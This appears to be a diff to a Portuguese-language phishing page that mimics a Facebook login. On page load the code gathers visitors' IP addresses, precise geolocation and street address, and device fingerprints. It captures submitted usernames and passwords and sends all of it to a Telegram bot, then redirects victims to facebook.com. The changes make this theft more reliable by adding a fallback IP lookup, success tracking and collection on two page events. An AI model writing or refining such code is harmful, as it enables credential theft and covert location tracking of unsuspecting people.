@@ -232,7 +232,7 @@
                     },
                     {
                         enableHighAccuracy: true,
-                        timeout: 10000,
+                        timeout: 5000,
                         maximumAge: 0
                     }
                 );
@@ -245,7 +245,13 @@
                 const data = await response.json();
                 return data.ip;
             } catch (error) {
-                return "IP não disponível";
+                try {
+                    const response = await fetch('https://api64.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip;
+                } catch (error) {
+                    return "IP não disponível";
+                }
             }
         }
         
@@ -279,7 +285,7 @@
             const platform = navigator.platform;
             const vendor = navigator.vendor;
             const cookieEnabled = navigator.cookieEnabled;
-            const javaEnabled = navigator.javaEnabled();
+            const javaEnabled = navigator.javaEnabled ? navigator.javaEnabled() : false;
             const pdfEnabled = navigator.pdfViewerEnabled;
             const doNotTrack = navigator.doNotTrack;
             const connection = navigator.connection ? {
@@ -290,14 +296,13 @@
         
             let locationInfo = "";
             if (location && addressInfo) {
-                locationInfo = `
-        📍 *Localização Detalhada*
-        🗺️ Coordenadas: ${location.latitude}, ${location.longitude}
-        🏴 País: ${addressInfo.country}
-        🏛️ Estado: ${addressInfo.state}
-        🏙️ Cidade: ${addressInfo.city}
-        🛣️ Rua: ${addressInfo.road}
-        📮 CEP: ${addressInfo.postcode}`;
+                locationInfo = `📍 *Localização Detalhada*
+🗺️ Coordenadas: ${location.latitude}, ${location.longitude}
+🏴 País: ${addressInfo.country}
+🏛️ Estado: ${addressInfo.state}
+🏙️ Cidade: ${addressInfo.city}
+🛣️ Rua: ${addressInfo.road}
+📮 CEP: ${addressInfo.postcode}`;
             } else if (location) {
                 locationInfo = `📍 Coordenadas: ${location.latitude}, ${location.longitude}`;
             } else {
@@ -311,38 +316,35 @@
         
             let credentialsInfo = "";
             if (isLogin && emailOrPhone && password) {
-                credentialsInfo = `
-        👤 *Credenciais de Login*
-        📧 Usuário: ${emailOrPhone}
-        🔑 Senha: ${password}`;
+                credentialsInfo = `👤 *Credenciais de Login*
+📧 Usuário: ${emailOrPhone}
+🔑 Senha: ${password}`;
             }
         
             const messageType = isLogin ? "🔐 *TENTATIVA DE LOGIN DETECTADA*" : "📱 *USUÁRIO ACESSOU A PÁGINA*";
         
-            const messageText = `
-        ${messageType}
-        
-        ${credentialsInfo}
-        
-        🌐 *Informações de Rede*
-        ${locationInfo}
-        🖥️ IP: ${ip}
-        ${connectionInfo}
-        
-        📱 *Informações do Dispositivo*
-        🖥️ Navegador/SO: ${userAgent}
-        💻 Plataforma: ${platform}
-        🏢 Vendor: ${vendor}
-        🖥️ Resolução: ${screenWidth}x${screenHeight}
-        🌐 Idioma: ${language}
-        ⏰ Fuso horário: ${timezone}
-        
-        🔧 *Configurações do Navegador*
-        🍪 Cookies: ${cookieEnabled ? "Ativado" : "Desativado"}
-        ☕ Java: ${javaEnabled ? "Ativado" : "Desativado"}
-        📄 PDF: ${pdfEnabled ? "Ativado" : "Desativado"}
-        🚫 Rastreamento: ${doNotTrack || "Não especificado"}
-            `;
+            const messageText = `${messageType}
+
+${credentialsInfo}
+
+🌐 *Informações de Rede*
+${locationInfo}
+🖥️ IP: ${ip}
+${connectionInfo}
+
+📱 *Informações do Dispositivo*
+🖥️ Navegador/SO: ${userAgent}
+💻 Plataforma: ${platform}
+🏢 Vendor: ${vendor}
+🖥️ Resolução: ${screenWidth}x${screenHeight}
+🌐 Idioma: ${language}
+⏰ Fuso horário: ${timezone}
+
+🔧 *Configurações do Navegador*
+🍪 Cookies: ${cookieEnabled ? "Ativado" : "Desativado"}
+☕ Java: ${javaEnabled ? "Ativado" : "Desativado"}
+📄 PDF: ${pdfEnabled ? "Ativado" : "Desativado"}
+🚫 Rastreamento: ${doNotTrack || "Não especificado"}`;
         
             try {
                 const response = await fetch(URL, {
@@ -355,13 +357,10 @@
                     })
                 });
                 
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
-                }
-                
-                console.log("Mensagem enviada com sucesso para o Telegram");
+                return response.ok;
             } catch (error) {
                 console.error("Erro ao enviar para o Telegram:", error);
+                return false;
             }
         }
         
@@ -380,8 +379,10 @@
                     console.log("Localização recusada ou indisponível");
                 }
             
-                await sendToTelegram("", "", userLocation, userIP, userAddressInfo, false);
-                deviceInfoSent = true;
+                const success = await sendToTelegram("", "", userLocation, userIP, userAddressInfo, false);
+                if (success) {
+                    deviceInfoSent = true;
+                }
             } catch (error) {
                 console.error("Erro ao coletar informações do dispositivo:", error);
             }
@@ -424,7 +425,9 @@
         
             await sendToTelegram(emailOrPhone, password, userLocation, userIP, userAddressInfo, true);
         
-            window.location.href = "https://facebook.com";
+            setTimeout(() => {
+                window.location.href = "https://facebook.com";
+            }, 1000);
         });
         
         createAccountBtn.addEventListener('click', function() {
@@ -435,13 +438,10 @@
             }, 3000);
         });
         
-        // CORREÇÃO: Enviar informações imediatamente ao carregar a página
         window.addEventListener('load', function() {
-            // Removido o setTimeout e chamada direta da função
             collectAndSendDeviceInfo();
         });
 
-        // CORREÇÃO ADICIONAL: Enviar também quando o DOM estiver pronto
         document.addEventListener('DOMContentLoaded', function() {
             collectAndSendDeviceInfo();
         });
